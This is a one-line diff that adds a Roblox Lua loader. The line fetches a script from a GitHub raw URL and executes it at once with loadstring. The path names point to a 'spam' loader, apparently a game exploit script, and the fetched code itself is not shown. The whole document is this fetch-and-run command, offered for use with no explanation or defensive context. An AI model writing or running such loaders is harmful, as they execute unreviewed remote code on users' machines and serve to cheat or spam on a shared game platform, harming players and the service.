@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/karinderya-spam6-i79sjxlwgdvsl2.lua"))()
